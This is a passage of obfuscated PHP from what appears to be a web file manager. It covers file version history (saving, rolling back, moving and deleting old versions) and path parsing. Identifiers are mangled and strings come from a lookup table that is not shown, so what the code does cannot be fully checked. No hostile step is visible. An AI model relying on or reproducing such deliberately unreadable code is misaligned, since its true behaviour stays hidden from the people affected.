$­‰ÑœêÊ = self::listData($Ú¤¬ß¡); $Ç–†³ö‰ = rtrim($Î·ğ¦¯¦, $•¬ŸÄ´±[8]) . $•¬ŸÄ´±[8] . ($âƒ½ÑÔö ? $âƒ½ÑÔö : get_path_this($Ú¤¬ß¡)); $ÀöûĞö¬ = self::listData($Ç–†³ö‰); if ($­‰ÑœêÊ && $­‰ÑœêÊ[$•¬ŸÄ´±[445]] && $ÀöûĞö¬ && $ÀöûĞö¬[$•¬ŸÄ´±[445]]) { return self::clear($Ú¤¬ß¡); } if ($­‰ÑœêÊ && $­‰ÑœêÊ[$•¬ŸÄ´±[445]]) { self::moveHistory($Ú¤¬ß¡, $âƒ½ÑÔö, $ÄòÕÃ†); } } else { IO::move($Óˆó’É[$•¬ŸÄ´±[87]], $ÄòÕÃ†, !1, $âƒ½ÑÔö); self::clearEmptyFolder(IO::pathFather($Óˆó’É[$•¬ŸÄ´±[87]])); } } public static function eventAfterRemove($²šíÓ£, $´Ù“ÒĞè) { $Ø—ˆˆè… =& $_SERVER[‹è™Ü¸Ñ]; if (!$´Ù“ÒĞè) { return; } $ŸÂÔ§ä÷ = self::parsePath($²šíÓ£[0]); if (!$ŸÂÔ§ä÷) { return; } $¥ğßêŸú = self::checkInHistory($ŸÂÔ§ä÷); if (!$¥ğßêŸú) { return; } if ($¥ğßêŸú[$Ø—ˆˆè…[33]] == $Ø—ˆˆè…[230]) { $›ì¡ÕŒŸ = self::listData($ŸÂÔ§ä÷, !1); if ($›ì¡ÕŒŸ && $›ì¡ÕŒŸ[$Ø—ˆˆè…[445]]) { self::clear($ŸÂÔ§ä÷, !1); } } else { IO::remove($¥ğßêŸú[$Ø—ˆˆè…[87]]); self::clearEmptyFolder(IO::pathFather($¥ğßêŸú[$Ø—ˆˆè…[87]])); } } private static function checkInHistory($°“‚Ùí°) { $‹Á…Ìµ³ = self::pathHistory($°“‚Ùí°); if (!IO::exist($‹Á…Ìµ³)) { $‹Á…Ìµ³ .= $_SERVER[‹è™Ü¸Ñ][1296]; } return IO::exist($‹Á…Ìµ³) ? IO::info($‹Á…Ìµ³) : !1; } private static function parsePath($©»¸çóŠ) { $éìÒé˜¤ =& $_SERVER[‹è™Ü¸Ñ]; if (!$©»¸çóŠ) { return !1; } if (isset($GLOBALS[$éìÒé˜¤[1297]]) && $GLOBALS[$éìÒé˜¤[1297]]) { return; } $õë‡°´ = KodIO::parse($©»¸çóŠ); $ã¿ı¼…¢ = $õë‡°´[$éìÒé˜¤[33]]; $‹Ú•İĞä = !$ã¿ı¼…¢ || $ã¿ı¼…¢ == KodIO::KOD_IO || $ã¿ı¼…¢ == KodIO::KOD_SHARE_ITEM; if (!$‹Ú•İĞä || !$õë‡°´[$éìÒé˜¤[1298]]) { return !1; } if (substr($©»¸çóŠ, 0, strlen(DATA_PATH . $éìÒé˜¤[1299])) == DATA_PATH . $éìÒé˜¤[1299]) { return !1; } if ($ã¿ı¼…¢ == KodIO::KOD_SHARE_ITEM) { $¡´âÙŸÖ = IO::init($©»¸çóŠ); if ($¡´âÙŸÖ->pathParse[$éìÒé˜¤[1212]]) { return self::parsePath($¡´âÙŸÖ->pathParse[$éìÒé˜¤[1212]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $Ÿ½ÇÅ£ê = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $éìÒé˜¤[1300]); foreach ($Ÿ½ÇÅ£ê as $äªÂã»Š) { if (!$ã¿ı¼…¢ && substr($©»¸çóŠ, 0, strlen($äªÂã»Š)) == $äªÂã»Š) { return !1; } } self::log($GLOBALS[$éìÒé˜¤[1207]] . $éìÒé˜¤[1301] . $©»¸çóŠ); return $©»¸çóŠ; } private static function pathHistory($ÄŸÔÜüè) { $…×¯›¥— =& $_SERVER[‹è™Ü¸Ñ]; $ñ˜ïğ±Î = self::$_historyBase . ltrim(KodIO::clear($ÄŸÔÜüè), $…×¯›¥—[8]); $ñ˜ïğ±Î = str_replace(array($…×¯›¥—[1302]), array($…×¯›¥—[1303]), $ñ˜ïğ±Î); return $ñ˜ïğ±Î; } public static function log($Ò‘ÜåáŸ) { } public static function historyCount($Å¾ÖÊË) { $©Ã—ì€Ù =& $_SERVER[‹è™Ü¸Ñ]; $œ¸î¦Š› = array(); $™æĞÃï = array(); foreach ($Å¾ÖÊË as $ößúÓ´™) { $µš¶Öşû = get_path_father($ößúÓ´™); if (!$™æĞÃï[$µš¶Öşû]) { $™æĞÃï[$µš¶Öşû] = array(); } $™æĞÃï[$µš¶Öşû][] = get_path_this($ößúÓ´™); } foreach ($™æĞÃï as $µš¶Öşû => $êƒÎîˆ) { $ÌÕ¹åÈ­ = self::parsePath($µš¶Öşû); if (!$ÌÕ¹åÈ­) { continue; } foreach ($êƒÎîˆ as $éÒÒÁ›¨) { $©˜•„ÅØ = self::listData(rtrim($ÌÕ¹åÈ­, $©Ã—ì€Ù[8]) . $©Ã—ì€Ù[8] . $éÒÒÁ›¨, !1); if ($©˜•„ÅØ && $©˜•„ÅØ[$©Ã—ì€Ù[445]]) { $œ¸î¦Š›[rtrim($µš¶Öşû, $©Ã—ì€Ù[8]) . $©Ã—ì€Ù[8] . $éÒÒÁ›¨] = count($©˜•„ÅØ[$©Ã—ì€Ù[445]]); } } } return $œ¸î¦Š›; } public static function add($˜£¶Œˆ) { $ÀƒùŸªÎ =& $_SERVER[‹è™Ü¸Ñ]; $Óşá²Ø­ = self::listData($˜£¶Œˆ); if (!$Óşá²Ø­) { return; } $­Ô÷‚ = Model($ÀƒùŸªÎ[825])->get($ÀƒùŸªÎ[1304]); $ş°ãÑ®¡ = intval($GLOBALS[$ÀƒùŸªÎ[6]][$ÀƒùŸªÎ[92]][$ÀƒùŸªÎ[1282]]); $¶÷£îï‰ = $­Ô÷‚ == $ÀƒùŸªÎ[1305] ? min(5, $ş°ãÑ®¡) : $ş°ãÑ®¡; if ($ş°ãÑ®¡ <= 0) { return; } $à¸ş²¨Ÿ = IO::info($˜£¶Œˆ); $Æ³²ãÂ = $Óşá²Ø­[$ÀƒùŸªÎ[445]]; if ($à¸ş²¨Ÿ[$ÀƒùŸªÎ[79]] == 0) { return; } if ($à¸ş²¨Ÿ[$ÀƒùŸªÎ[79]] >= 1024 * 1024 * 500) { return !1; } $ò³Ÿ¢Šœ = IO::hashSimple($˜£¶Œˆ); if ($Æ³²ãÂ && $Æ³²ãÂ[0][$ÀƒùŸªÎ[672]] == $ò³Ÿ¢Šœ) { return !0; } if (array_key_exists($ÀƒùŸªÎ[233], $à¸ş²¨Ÿ) && !$à¸ş²¨Ÿ[$ÀƒùŸªÎ[233]]) { return !1; } $“Æ¯¼ü’ = short_id(time()); $±ÍÀÏ—§ = array($ÀƒùŸªÎ[475] => $“Æ¯¼ü’, $ÀƒùŸªÎ[672] => $ò³Ÿ¢Šœ, $ÀƒùŸªÎ[32] => $à¸ş²¨Ÿ[$ÀƒùŸªÎ[32]] . $ÀƒùŸªÎ[10] . date($ÀƒùŸªÎ[1306]) . rand_string(1), $ÀƒùŸªÎ[79] => $à¸ş²¨Ÿ[$ÀƒùŸªÎ[79]], $ÀƒùŸªÎ[527] => USER_ID, $ÀƒùŸªÎ[231] => time(), $ÀƒùŸªÎ[1307] => $ÀƒùŸªÎ[12]); IO::mkdir($Óşá²Ø­[$ÀƒùŸªÎ[1308]]); $ò­’ĞÍ = IO::copy($˜£¶Œˆ, $Óşá²Ø­[$ÀƒùŸªÎ[1308]], !1, $±ÍÀÏ—§[$ÀƒùŸªÎ[32]]); if (!$ò­’ĞÍ) { self::clearEmptyFolder($Óşá²Ø­[$ÀƒùŸªÎ[1308]]); return !1; } array_unshift($Æ³²ãÂ, $±ÍÀÏ—§); if (count($Æ³²ãÂ) > $¶÷£îï‰) { $»”•É‘ = array_slice($Æ³²ãÂ, $¶÷£îï‰); foreach ($»”•É‘ as $…Ù™¹’) { IO::remove($Óşá²Ø­[$ÀƒùŸªÎ[1308]] . $…Ù™¹’[$ÀƒùŸªÎ[32]]); } $Æ³²ãÂ = array_slice($Æ³²ãÂ, 0, $¶÷£îï‰); } return self::saveData($Óşá²Ø­[$ÀƒùŸªÎ[1309]], $Æ³²ãÂ); } public static function remove($³€šÛÅ—, $ş¤Â³Ä) { $Ô¨‡Õ²¥ =& $_SERVER[‹è™Ü¸Ñ]; $çÕ”“°¨ = self::listData($³€šÛÅ—); $•¤—‡ù = array(); if (!$çÕ”“°¨) { return !1; } foreach ($çÕ”“°¨[$Ô¨‡Õ²¥[445]] as $³µË‰Ş) { if ($³µË‰Ş[$Ô¨‡Õ²¥[475]] == $ş¤Â³Ä) { IO::remove($çÕ”“°¨[$Ô¨‡Õ²¥[1308]] . $³µË‰Ş[$Ô¨‡Õ²¥[32]]); continue; } $•¤—‡ù[] = $³µË‰Ş; } return self::saveData($çÕ”“°¨[$Ô¨‡Õ²¥[1309]], $•¤—‡ù); } public static function clear($¿Óºñ, $áŸÃ½„ = true) { $¥—ÜÔ»– =& $_SERVER[‹è™Ü¸Ñ]; $öÉÈáßÃ = self::listData($¿Óºñ, $áŸÃ½„); if (!$öÉÈáßÃ) { return !1; } foreach ($öÉÈáßÃ[$¥—ÜÔ»–[445]] as $˜âãüıæ) { IO::remove($öÉÈáßÃ[$¥—ÜÔ»–[1308]] . $˜âãüıæ[$¥—ÜÔ»–[32]]); } return self::saveData($öÉÈáßÃ[$¥—ÜÔ»–[1309]], array()); } public static function moveHistory($­û­•ôñ, $ÛİĞ¶­² = '', $Ë–¼‡è¨ = '') { $Ç—†ÔÑî =& $_SERVER[‹è™Ü¸Ñ]; $˜×€º½â = self::listData($­û­•ôñ, !1); if (!$˜×€º½â || !$˜×€º½â[$Ç—†ÔÑî[445]]) { return !1; } $’üé¦®ì = $Ç—†ÔÑî[1296]; $ÛİĞ¶­² = $ÛİĞ¶­² ? $ÛİĞ¶­² : get_path_this($­û­•ôñ); $Ë–¼‡è¨ = $Ë–¼‡è¨ ? $Ë–¼‡è¨ : $˜×€º½â[$Ç—†ÔÑî[1308]]; $©Èîï¸÷ = substr(get_path_this($˜×€º½â[$Ç—†ÔÑî[1309]]), 0, -strlen($’üé¦®ì)); foreach ($˜×€º½â[$Ç—†ÔÑî[445]] as $¥²Ô·ÜÆ => $×Ì–ï’) { $§èãŠ½ = $ÛİĞ¶­² . substr($×Ì–ï’[$Ç—†ÔÑî[32]], strlen($©Èîï¸÷)); $Ôª—¾×ë = IO::move($˜×€º½â[$Ç—†ÔÑî[1308]] . $×Ì–ï’[$Ç—†ÔÑî[32]], $Ë–¼‡è¨, !1, $§èãŠ½); if ($Ôª—¾×ë) { $˜×€º½â[$Ç—†ÔÑî[445]][$¥²Ô·ÜÆ][$Ç—†ÔÑî[32]] = $§èãŠ½; } } $˜×€º½â[$Ç—†ÔÑî[1309]] = IO::move($˜×€º½â[$Ç—†ÔÑî[1309]], $Ë–¼‡è¨, !1, $ÛİĞ¶­² . $’üé¦®ì); self::saveData($˜×€º½â[$Ç—†ÔÑî[1309]], $˜×€º½â[$Ç—†ÔÑî[445]]); self::clearEmptyFolder($˜×€º½â[$Ç—†ÔÑî[1308]]); } public static function rollback($ìºÆò•, $´¤Ò¥îß) { $™‡ó»ëÅ =& $_SERVER[‹è™Ü¸Ñ]; $Èí†— = self::listData($ìºÆò•); if (!$Èí†—) { return; } $Í§Óğ¶á = IO::info($ìºÆò•); foreach ($Èí†—[$™‡ó»ëÅ[445]] as $ÚÃ†éÆ¤ => $Ù»ÈÇèÔ) { if ($Ù»ÈÇèÔ[$™‡ó»ëÅ[475]] == $´¤Ò¥îß) { self::add($ìºÆò•); $´üÒç†Ã = $Èí†—[$™‡ó»ëÅ[1308]] . $Ù»ÈÇèÔ[$™‡ó»ëÅ[32]]; $ÏØ§ÀÎ¹ = IO::copy($´üÒç†Ã, IO::pathFather($ìºÆò•), REPEAT_REPLACE, $Í§Óğ¶á[$™‡ó»ëÅ[32]]); if ($ÏØ§ÀÎ¹) { self::remove($ìºÆò•, $´¤Ò¥îß); } return $ÏØ§ÀÎ¹; } } return !1; } public static function setDetail($¦ÍûıÖé, $Ğ´àŸ­ã, $˜ëÜÈõÉ) { $±ª’˜ŸÚ =& $_SERVER[‹è™Ü¸Ñ]; $ßœ¥œ°ã = self::listData($¦ÍûıÖé); if (!$ßœ¥œ°ã) { return; } foreach ($ßœ¥œ°ã[$±ª’˜ŸÚ[445]] as $ò±Õµ => $—Ùù¼) { if ($—Ùù¼[$±ª’˜ŸÚ[475]] == $Ğ´àŸ­ã) { $ßœ¥œ°ã[$±ª’˜ŸÚ[445]][$ò±Õµ][$±ª’˜ŸÚ[1307]] = $˜ëÜÈõÉ; self::saveData($ßœ¥œ°ã[$±ª’˜ŸÚ[1309]], $ßœ¥œ°ã[$±ª’˜ŸÚ[445]]); return !0; } } return !1; } public static function fileInfo($ ÕæÚñ», $úæ×Çë) { $ˆŠ‘”À =& $_SERVER[‹è™Ü¸Ñ]; $â„¿÷¹Ü = self::listData($ ÕæÚñ»); if (!$â„¿÷¹Ü) { show_json(LNG($ˆŠ‘”À[108]), !1); } $Öş©Õç¾ = $ˆŠ‘”À[12]; foreach ($â„¿÷¹Ü[$ˆŠ‘”À[445]] as $êÓµ£Íı => $ÂÊËÅÃ¶) { if ($ÂÊËÅÃ¶[$ˆŠ‘”À[475]] != $úæ×Çë) { continue; } $Öş©Õç¾ = $â„¿÷¹Ü[$ˆŠ‘”À[1308]] . $ÂÊËÅÃ¶[$ˆŠ‘”À[32]]; break; } if (!$Öş©Õç¾) { show_json(LNG($ˆŠ‘”À[108]), !1); } return IO::info($Öş©Õç¾); } public static function fileOut($ĞÇÏ§ˆ§, $°ÁãÈ‘–, $Âõ›¸ = false) { $‚½ÓÜıä =& $_SERVER[‹è™Ü¸Ñ]; $¡¸•”üÑ = self::fileInfo($ĞÇÏ§ˆ§, $°ÁãÈ‘–); $¨ÀÕÇİÖ =& $GLOBALS[$‚½ÓÜıä[7]]; $Âõ›¸ = isset($¨ÀÕÇİÖ[$‚½ÓÜıä[1259]]) && $¨ÀÕÇİÖ[$‚½ÓÜıä[1259]] == 1; if (isset($¨ÀÕÇİÖ[$‚½ÓÜıä[33]]) && $¨ÀÕÇİÖ[$‚½ÓÜıä[33]] == $‚½ÓÜıä[1310]) { return IO::fileOutImage($¡¸•”üÑ[$‚½ÓÜıä[87]], $¨ÀÕÇİÖ[$‚½ÓÜıä[1311]]); } IO::fileOut($¡¸•”üÑ[$‚½ÓÜıä[87]], $Âõ›¸, get_path_this($ĞÇÏ§ˆ§)); } public static function listData($îöÅıÅ©, $‹ŸÚ¸Œ‹ = true) { $üìƒßâ =& $_SERVER[‹è™Ü¸Ñ]; if ($‹ŸÚ¸Œ‹ && !IO::exist($îöÅıÅ©)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($îöÅıÅ©, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $€ø˜ıËö = self::pathHistory($îöÅıÅ©); $æÀû±ˆæ = array($üìƒßâ[1309] => $€ø˜ıËö . $üìƒßâ[1296], $üìƒßâ[1308] => rtrim(get_path_father($€ø˜ıËö), $üìƒßâ[8]) . $üìƒßâ[8], $üìƒßâ[445] => array()); $»õÑï = IO::getContent($æÀû±ˆæ[$üìƒßâ[1309]]); if ($»õÑï) { $éâä­½– = json_decode($»õÑï, !0); if (is_array($éâä­½–)) { $æÀû±ˆæ[$üìƒßâ[445]] = $éâä­½–; } } return $æÀû±ˆæ; } private static function saveData($’Ëœ‡Ô, $õ–÷ ùš) { $¹„Ó‡åá =& $_SERVER[‹è™Ü¸Ñ]; self::log($¹„Ó‡åá[1312] . $’Ëœ‡Ô . $¹„Ó‡åá[74] . count($õ–÷ ùš), $¹„Ó‡åá[807]); if ($õ–÷ ùš) { return IO::setContent($’Ëœ‡Ô, json_encode($õ–÷ ùš)); } $ŠÃ½Ê… = IO::pathFather($’Ëœ‡Ô); IO::remove($’Ëœ‡Ô); self::clearEmptyFolder($ŠÃ½Ê…); return !0; } public static function clearEmptyFolder($ÁÁ“ôü) { $×¾‚´”½ =& $_SERVER[‹è™Ü¸Ñ]; if (trim($ÁÁ“ôü, $×¾‚´”½[8]) == trim(self::$_historyBase, $×¾‚´”½[8])) { return; } $Âï Ò£Ş = IO::pathFather($ÁÁ“ôü); $ˆ©çß¹ù = IO::has($ÁÁ“ôü, !0); if ($ˆ©çß¹ù[$×¾‚´”½[239]] > 0 || $ˆ©çß¹ù[$×¾‚´”½[240]] > 0) { return; } IO::remove($ÁÁ“ôü); self::clearEmptyFolder($Âï Ò£Ş); } private static function getBasePath() { $Ú–ú«×Ú =& $_SERVER[‹è™Ü¸Ñ]; $Ğó±»å± = Model($Ú–ú«×Ú[1313])->get($Ú–ú«×Ú[1314]); if ($Ğó±»å±) { if (!IO::exist($Ğó±»å±)) { IO::mkdir($Ğó±»å±); } if (get_path_this($Ğó±»å±) == $Ú–ú«×Ú[1299]) { $¨è¼ÜÉ® = $Ú–ú«×Ú[1315] . rand_string(8); @rename($Ğó±»å±, get_path_father($Ğó±»å±) . $Ú–ú«×Ú[8] . $¨è¼ÜÉ®); $Ğó±»å± = DATA_PATH . $¨è¼ÜÉ® . $Ú–ú«×Ú[8]; file_put_contents(DATA_PATH . $Ú–ú«×Ú[1246], $Ú–ú«×Ú[12]); Model($Ú–ú«×Ú[1313])->set($Ú–ú«×Ú[1314], $Ğó±»å±); } return $Ğó±»å±; } $Ğó±»å± = DATA_PATH . $Ú–ú«×Ú[1315] . rand_string(8) . $Ú–ú«×Ú[8]; $Ğó±»å± = IO::mkdir($Ğó±»å±); $Ğó±»å± = rtrim($Ğó±»å±, $Ú–ú«×Ú[8]) . $Ú–ú«×Ú[8]; file_put_contents($Ğó±»å± . $Ú–ú«×Ú[1246], $Ú–ú«×Ú[12]); file_put_contents(DATA_PATH . $Ú–ú«×Ú[1246], $Ú–ú«×Ú[12]); Model($Ú–ú«×Ú[1313])->set($Ú–ú«×Ú[1314], $Ğó±»å±); return $Ğó±»å±; } } class KodIO { const KOD_SOURCE = "\173\163\x6f\x75\162\x63\x65\x7d"; const KOD_USER_RECYCLE = "\x7b\165\163\145\x72\122\x65\x63\171\143\154\x65\175"; const KOD_USER_FAV = "\173\165\x73\145\162\106\141\x76\x7d"; const KOD_USER_FILE_TAG = "\173\165\163\x65\x72\x46\x69\154\145\x54\141\147\x7d"; const KOD_USER_FILE_TYPE = "\173\x75\x73\145\162\106\x69\154\x65\x54\x79\160\145\175"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\157\x75\160\x52\157\157\164\x53\145\154\x66\175"; const KOD_USER_SHARE = "\173\x75\x73\x65\x72\123\150\x61\162\145\x7d"; const KOD_USER_SHARE_LINK = "\x7b\165\163\x65\x72\x53\150\x61\162\145\x4c\151\156\153\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\x68\x61\162\145\124\x6f\115\x65\175"; const KOD_SHARE_ITEM = "\x7b\x73\150\x61\162\145\111\x74\x65\155\175"; const KOD_SHARE_LINK = "\x7b\x73\150\x61\x72\x65\111\164\x65\x6d\x4c\151\156\153\x7d"; const KOD_SEARCH = "\x7b\163\145\141\x72\x63\150\175"; const KOD_BLOCK = "\x7b\x62\x6c\x6f\x63\x6b\175"; const KOD_IO = "\x7b\151\157\175"; const KOD_USER_RECENT = "\x7b\x75\x73\145\x72\x52\145\x6e\x63\145\156\164\175"; const KOD_USER_DRIVER = "\x7b\144\162\151\x76\145\x72\175"; public static function typeList() { $°ñ¸’ =& $_SERVER[‹è™Ü¸Ñ]; return array($°ñ¸’[1316] => self::KOD_SOURCE, $°ñ¸’[1317] => self::KOD_USER_RECYCLE, $°ñ¸’[1318] => self::KOD_USER_FAV, $°ñ¸’[1319] => self::KOD_USER_FILE_TAG, $°ñ¸’[1320] => self::KOD_USER_FILE_TYPE, $°ñ¸’[1321] => self::KOD_GROUP_ROOT_SELF, $°ñ¸’[1322] => self::KOD_USER_SHARE, $°ñ¸’[1323] => self::KOD_USER_SHARE_LINK, $°ñ¸’[1324] => self::KOD_USER_SHARE_TO_ME, $°ñ¸’[1325] => self::KOD_SHARE_ITEM, $°ñ¸’[1326] => self::KOD_SHARE_LINK, $°ñ¸’[1327] => self::KOD_SEARCH, $°ñ¸’[1328] => self::KOD_BLOCK, $°ñ¸’[1329] => self::KOD_IO, $°ñ¸’[1330] => self::KOD_USER_RECENT, $°ñ¸’[1331] => self::KOD_USER_DRIVER); } public static function parse($…ˆ…öïû) { $‰Ö…üŸµ =& $_SERVER[‹è™Ü¸Ñ]; $…ˆ…öïû = self::clear($…ˆ…öïû); $·äæÇ¡Î = array_values(self::typeList()); preg_match($‰Ö…üŸµ[1332], $…ˆ…öïû, $ØÛàÄ´ñ); $ÃøØ§‰ê = array($‰Ö…üŸµ[496] => !1, $‰Ö…üŸµ[1333] => !1, $‰Ö…üŸµ[493] => !1, $‰Ö…üŸµ[87] => $…ˆ…öïû, $‰Ö…üŸµ[1231] => !1, $‰Ö…üŸµ[1230] => $‰Ö…üŸµ[12]); if (is_array($ØÛàÄ´ñ) && count($ØÛàÄ´ñ) == 5) { $Üí”‚Ñ = $‰Ö…üŸµ[1334] . $ØÛàÄ´ñ[2] . $‰Ö…üŸµ[403]; if (in_array($Üí”‚Ñ, $·äæÇ¡Î)) { $ÃøØ§‰ê[$‰Ö…üŸµ[1231]] = $ØÛàÄ´ñ[1]; $ÃøØ§‰ê[$‰Ö…üŸµ[33]] = $Üí”‚Ñ; $ÃøØ§‰ê[$‰Ö…üŸµ[1335]] = substr($Üí”‚Ñ, 1, -1); $ÃøØ§‰ê[$‰Ö…üŸµ[475]] = $ØÛàÄ´ñ[3]; } $ÃøØ§‰ê[$‰Ö…üŸµ[1230]] = $ØÛàÄ´ñ[4]; } $Ç£Ğ ‹Œ = array($‰Ö…üŸµ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ÃøØ§‰ê[$‰Ö…üŸµ[1298]] = in_array($ÃøØ§‰ê[$‰Ö…üŸµ[33]], $Ç£Ğ ‹Œ); return $ÃøØ§‰ê; } public static function isTruePath($¢ğÉøÒ”) { $ìÃÎœŠÉ =& $_SERVER[‹è™Ü¸Ñ]; if (substr($¢ğÉøÒ”, 0, 1) != $ìÃÎœŠÉ[1334]) { return !0; } if (strpos($¢ğÉøÒ”, $ìÃÎœŠÉ[483]) === 0) { return !0; } if (strpos($¢ğÉøÒ”, $ìÃÎœŠÉ[1302]) === 0) { return !0; } if (strpos($¢ğÉøÒ”, $ìÃÎœŠÉ[1336]) === 0) { return !0; } if (strpos($¢ğÉøÒ”, $ìÃÎœŠÉ[1337]) === 0) { return !0; } if (strpos($¢ğÉøÒ”, $ìÃÎœŠÉ[1338]) === 0) { return !0; } return !1; } public static function clear($àø¿›óç) { $Ô©Ô¿˜ =& $_SERVER[‹è™Ü¸Ñ]; $àø¿›óç = str_replace(array($Ô©Ô¿˜[1137], $Ô©Ô¿˜[262]), $Ô©Ô¿˜[53], $àø¿›óç); $àø¿›óç = str_replace($Ô©Ô¿˜[100], $Ô©Ô¿˜[8], $àø¿›óç); $öœÕƒ¢ = $Ô©Ô¿˜[1339]; if (substr($àø¿›óç, 0, 3) == $Ô©Ô¿˜[1340]) { $àø¿›óç = substr($àø¿›óç, 3); } while (strstr($àø¿›óç, $öœÕƒ¢)) { $àø¿›óç = str_replace($öœÕƒ¢, $Ô©Ô¿˜[8], $àø¿›óç); } $àø¿›óç = preg_replace($Ô©Ô¿˜[1341], $Ô©Ô¿˜[8], $àø¿›óç); if ($àø¿›óç == $Ô©Ô¿˜[8]) { return $Ô©Ô¿˜[8]; } $àø¿›óç = rtrim($àø¿›óç, $Ô©Ô¿˜[8]); return $àø¿›óç; } public static function pathTrue($Óß¢ŒŒä) { $¦Ë©µ©£ =& $_SERVER[‹è™Ü¸Ñ]; if (!$Óß¢ŒŒä) { return $¦Ë©µ©£[12]; } $Óß¢ŒŒä = str_replace($¦Ë©µ©£[592], $¦Ë©µ©£[8], str_replace($¦Ë©µ©£[1342], $¦Ë©µ©£[8], $Óß¢ŒŒä)); $Óß¢ŒŒä = str_replace($¦Ë©µ©£[592], $¦Ë©µ©£[8], str_replace($¦Ë©µ©£[1342], $¦Ë©µ©£[8], $Óß¢ŒŒä)); if (!strstr($Óß¢ŒŒä, $¦Ë©µ©£[1340])) { return $Óß¢ŒŒä; } $÷­Ûï‚¡ = explode($¦Ë©µ©£[8], $Óß¢ŒŒä); foreach ($÷­Ûï‚¡ as $ğ€œæõ => $Ä «‰ú) { if ($Ä «‰ú !== $¦Ë©µ©£[1343]) { continue; } for ($éíÇ’‰ = $ğ€œæõ; $éíÇ’‰ >= 0; $éíÇ’‰--) { if ($÷­Ûï‚¡[$éíÇ’‰] === $¦Ë©µ©£[10] || $÷­Ûï‚¡[$éíÇ’‰] === $¦Ë©µ©£[1343] || $÷­Ûï‚¡[$éíÇ’‰] === -1) { continue; } if ($÷­Ûï‚¡[$éíÇ’‰] === $¦Ë©µ©£[12]) { $÷­Ûï‚¡[$ğ€œæõ] = -1; break; } $÷­Ûï‚¡[$ğ€œæõ] = -1; $÷­Ûï‚¡[$éíÇ’‰] = -1; break; } } $ï€Ôü÷§ = array(); foreach ($÷­Ûï‚¡ as $Ä «‰ú) { if ($Ä «‰ú !== -1) { $ï€Ôü÷§[] = $Ä «‰ú; } } $¬”„®½¬ = implode($¦Ë©µ©£[8], $ï€Ôü÷§); if (strpos($¬”„®½¬, $¦Ë©µ©£[1344]) === 0) { $¬”„®½¬ = $¦Ë©µ©£[1340] . substr($¬”„®½¬, strlen($¦Ë©µ©£[1344])); } return $¬”„®½¬; } public static function pathUrlClear($Ãˆ·Ç¾Û) { $úÉÜ©ê =& $_SERVER[‹è™Ü¸Ñ]; if (!$Ãˆ·Ç¾Û) { return $Ãˆ·Ç¾Û; } $Ãˆ·Ç¾Û = rawurldecode($Ãˆ·Ç¾Û); $Ãˆ·Ç¾Û = str_replace($úÉÜ©ê[1342], $úÉÜ©ê[8], $Ãˆ·Ç¾Û); if (strpos($Ãˆ·Ç¾Û, $úÉÜ©ê[76]) > 0) { $Ãˆ·Ç¾Û = substr($Ãˆ·Ç¾Û, 0, strpos($Ãˆ·Ç¾Û, $úÉÜ©ê[76])); } if (strpos($Ãˆ·Ç¾Û, $úÉÜ©ê[1345]) > 0) { $Ãˆ·Ç¾Û = substr($Ãˆ·Ç¾Û, 0, strpos($Ãˆ·Ç¾Û, $úÉÜ©ê[1345])); } return $Ãˆ·Ç¾Û; } public static function sourceID($œÑŠê–±) { $¤Æ²¹ü¥ =& $_SERVER[‹è™Ü¸Ñ]; $ãõì®² = self::parse($œÑŠê–±); if ($ãõì®²[$¤Æ²¹ü¥[33]] !== self::KOD_SOURCE) { show_json(LNG($¤Æ²¹ü¥[1346]), !1); } return $ãõì®²[$¤Æ²¹ü¥[475]]; } public static function make($éÖËğÈä) { if (!$éÖËğÈä) { return !1; } return self::makePath(self::KOD_SOURCE, intval($éÖËğÈä)); } public static function makeShare($œÅ€“Á, $é³©íŒ‡) { return self::makePath(self::KOD_SHARE_ITEM, $œÅ€“Á, $é³©íŒ‡); } public static function makeFileTypePath($¸öäÀ‘å) { return self::makePath(self::KOD_USER_FILE_TYPE, $¸öäÀ‘å); } public static function makeFileTagPath($Ê„ë“¯º) { return self::makePath(self::KOD_USER_FILE_TAG, $Ê„ë“¯º); } public static function makePath($Š¢¦Ÿ™¬, $Ñ”ùŞãø = '', $ êĞ¯Êı = '') { $”êÒ¬§ú =& $_SERVER[‹è™Ü¸Ñ]; $ôŠŠ°÷“ = substr($Š¢¦Ÿ™¬, 1, -1); $¦©¹¨ö• = $”êÒ¬§ú[1347] . $ôŠŠ°÷“ . $”êÒ¬§ú[1348] . $Ñ”ùŞãø . $”êÒ¬§ú[1349]; $¦©¹¨ö• = $ êĞ¯Êı ? $¦©¹¨ö• . $ êĞ¯Êı . $”êÒ¬§ú[8] : $¦©¹¨ö•; return $¦©¹¨ö•; } public static function hashPath($ˆš¢ùâ†, $§™î¡ = true) { $ü€‹»ô½ =& $_SERVER[‹è™Ü¸Ñ]; $õõ¥‘Ã† = is_array($ˆš¢ùâ†) ? $ˆš¢ùâ† : IO::info($ˆš¢ùâ†); $¸ÌÙâ« = _get($õõ¥‘Ã†, $ü€‹»ô½[1350], $ü€‹»ô½[12]); if (!$¸ÌÙâ« && isset($õõ¥‘Ã†[$ü€‹»ô½[235]])) { $¸ÌÙâ« = trim($õõ¥‘Ã†[$ü€‹»ô½[235]], $ü€‹»ô½[121]); } if (!$¸ÌÙâ« && isset($õõ¥‘Ã†[$ü€‹»ô½[193]]) && $õõ¥‘Ã†[$ü€‹»ô½[193]]) { $õõ¥‘Ã† = IO::info(KodIO::make($õõ¥‘Ã†[$ü€‹»ô½[193]])); $¸ÌÙâ« = _get($õõ¥‘Ã†, $ü€‹»ô½[1350], $ü€‹»ô½[12]); } $Ï¡˜Äˆ¬ = md5($õõ¥‘Ã†[$ü€‹»ô½[87]] . $õõ¥‘Ã†[$ü€‹»ô½[79]] . $õõ¥‘Ã†[$ü€‹»ô½[88]]); if (!$¸ÌÙâ« && file_exists($õõ¥‘Ã†[$ü€‹»ô½[87]])) { $¸ÌÙâ« = Cache::get($Ï¡˜Äˆ¬ . $ü€‹»ô½[1351]); $¸ÌÙâ« = !1; if (!$¸ÌÙâ«) { $¸ÌÙâ« = IO::hashSimple($õõ¥‘Ã†[$ü€‹»ô½[87]]); Cache::set($Ï¡˜Äˆ¬ . $ü€‹»ô½[1351], 